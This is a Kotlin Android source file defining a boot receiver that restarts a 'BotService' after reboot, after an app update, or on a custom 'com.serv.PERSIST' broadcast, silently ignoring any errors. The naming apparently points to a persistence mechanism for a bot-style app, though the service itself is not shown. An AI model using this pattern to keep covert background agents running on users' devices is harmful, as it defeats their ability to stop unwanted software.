package com.serv.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.serv.app.service.BotService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        val action = intent?.action ?: return

        if (action == "com.serv.PERSIST") {
            try {
                val i = Intent(ctx, BotService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (_: Throwable) {}
        }

        if (action != Intent.ACTION_BOOT_COMPLETED &&
            action != Intent.ACTION_LOCKED_BOOT_COMPLETED &&
            action != Intent.ACTION_MY_PACKAGE_REPLACED) return

        try {
            val i = Intent(ctx, BotService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
            else ctx.startService(i)
        } catch (_: Throwable) {}
    }
}
